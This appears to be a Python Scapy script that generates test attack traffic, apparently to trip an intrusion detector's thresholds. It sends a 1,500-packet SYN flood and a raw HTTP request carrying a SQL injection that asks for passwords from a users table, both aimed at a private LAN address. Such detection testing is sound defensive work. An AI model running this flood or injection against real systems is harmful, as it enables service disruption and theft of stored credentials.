from scapy.all import *
import logging
import time

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def mixed_attack():
    interface = "\\Device\\NPF_{EEA7D8DE-AA83-47E0-AD2B-7769C77B662E}"
    target_ip = "192.168.0.100"
    syn_port = 80
    http_port = 8080
    syn_count = 1500  # Exceeds syn_flood_threshold (1000)

    logging.info(f"Starting mixed attack on {target_ip}")
    logging.info(f"Using interface: {interface}")

    # Verify interface
    try:
        conf.iface = interface
        logging.info(f"Scapy interface set to {interface}")
    except Exception as e:
        logging.error(f"Failed to set interface {interface}: {e}")
        return

    # SYN Flood
    logging.info(f"Sending {syn_count} SYN packets to {target_ip}:{syn_port}...")
    for i in range(syn_count):
        pkt = IP(dst=target_ip)/TCP(dport=syn_port, flags="S")
        try:
            send(pkt, iface=interface, verbose=0)
            if (i + 1) % 100 == 0:
                logging.info(f"Sent {i + 1} SYN packets")
            time.sleep(0.001)  # Small delay to ensure capture
        except Exception as e:
            logging.error(f"Failed to send SYN packet {i + 1}: {e}")
            break

    # SQL Injection
    logging.info(f"Sending SQL Injection packet to {target_ip}:{http_port}...")
    payload = "GET /?q=union+select+password+from+users HTTP/1.1\r\nHost: 192.168.0.100\r\n\r\n"
    pkt = IP(dst=target_ip)/TCP(dport=http_port, sport=RandShort(), flags="PA")/Raw(load=payload)
    try:
        send(pkt, iface=interface, verbose=0)
        logging.info("SQL Injection packet sent")
    except Exception as e:
        logging.error(f"Failed to send SQL Injection packet: {e}")

    logging.info("Mixed attack simulation complete.")

if __name__ == "__main__":
    mixed_attack()


